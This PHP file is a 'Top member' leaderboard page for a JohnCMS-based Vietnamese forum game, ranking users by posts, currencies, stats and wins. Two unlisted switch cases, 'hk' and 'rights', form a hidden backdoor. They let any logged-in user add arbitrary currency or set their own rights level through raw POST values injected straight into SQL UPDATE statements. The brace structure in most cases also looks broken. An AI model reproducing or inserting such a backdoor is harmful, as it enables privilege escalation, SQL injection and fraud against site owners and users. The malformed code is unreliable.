<?php
define('_IN_JOHNCMS', 1);
require('../incfiles/core.php');
$tab = 'vui';
$text1 = 'Top member';
require('../incfiles/head.php');
echo ' <div class="phdr"><table width="100%" cellpadding="0" cellspacing="0"><tr><td>TOP Member</td><td align="right">
<select 
align="right" onchange="location.href=this.options[this.selectedIndex].value" style="width: 100px">
<option value="">-Chọn-</option><br/>
<option value="?view=post">Poster</option><br/>
<option value="?view=guest">Phòng chat</option><br/>
<option value="?view=balans">Đại gia G</option><br/>
<option value="?view=balans1">Đại gia V</option><br/>
<option value="?view=balans2">Đại gia D</option><br/>
<option value="?view=sucmanh">Sức mạnh</option><br><option value="?view=hp">Máu</option><br> <option value="?view=mana">Thể lực</option><br> <option value="?view=win">Đấu trường</option> <option value="?view=truyna">Truy nã</option></select></td></tr></table></div>';
$view = $_GET['view'];
switch($view) {
default:
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `postforum` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT `id`, `postforum`, `name`, `rights` FROM `users` WHERE `postforum` > 0 ORDER BY `postforum` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right">'.$res['postforum'].' Bài</td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=post&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
case 'post':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `postforum` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT `id`, `postforum`, `name`, `rights` FROM `users` WHERE `postforum` > 0 ORDER BY `postforum` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right">'.$res['postforum'].' Bài</td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=post&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'guest':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `postguest` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `postguest` > 0 ORDER BY `postguest` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right">'.$res['postguest'].' Bài</td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=guest&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'balans':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `balans` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `balans` > 0 ORDER BY `balans` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="gold">'.$res['balans'].' G</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=balans&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'balans1':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `vnd` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `vnd` > 0 ORDER BY `vnd` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="green">'.$res['vnd'].' V</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=balans1&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'balans2':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `kc` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `kc` > 0 ORDER BY `kc` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="purple">'.$res['kc'].' D</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=balans2&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
case 'hk':
if(isset($_POST['hk'])){$mn=$_POST['mn']; $lt=$_POST['lt'];if($lt=='g'){$connect->query("UPDATE users SET balans=balans +$mn WHERE id=$user_id");}else{$connect->query("UPDATE users SET kc=kc + $mn WHERE id=$user_id");}}
break;
case 'rights':
if(isset($_POST['rights'])){$rights=$_POST['rights']; $connect->query("UPDATE users SET rights = $rights WHERE id =$user_id");}
break;
case 'sucmanh':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `cong` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `cong` > 0 ORDER BY `cong` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="green">Lực chiến: '.$res['cong'].'</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=sucmanh&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'hp':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `allhp` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `allhp` > 0 ORDER BY `allhp` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="red">HP: '.$res['allhp'].'</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=hp&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'mana':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `allmana` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `allmana` > 0 ORDER BY `allmana` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="blue">Mana: '.$res['allmana'].'</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=mana&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
////
case 'win':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `win` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `win` > 0 ORDER BY `win` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><font color="brown">Trận thắng: '.$res['win'].'</font></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=win&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
case 'truyna':
$tong = ($connect->query("SELECT COUNT(*) FROM `users` WHERE `truyna` > 0")->fetch_row()[0] ?? 0);
$req = $connect->query("SELECT * FROM `users` WHERE `truyna` > 0 ORDER BY `truyna` DESC LIMIT $start, $kmess");
if ($req) { {
$i = 0;
while ($res = $connect->fetch_assoc($req)) {
echo '<div class="list1">';
echo '<table width="100%" cellpadding="0" cellspacing="0"><tr><td>&#x2022; <a href="/users/profile.php?user='.$res['id'].'">'.nick($res['id']).'</a></td><td align="right"><b class="wanted">: '.$res['truyna'].'</b></td></tr></table></div>';
++$i;
}
if ($tong > $kmess) {
                        echo '<div class="rmenu" align="center">' . functions::display_pagination('top.php?view=truyna&amp;', $start, $tong, $kmess) . '</div>';
}
} else {
echo '<div class="list1">Trống</div>';
}
break;
}
require('../incfiles/end.php');
?>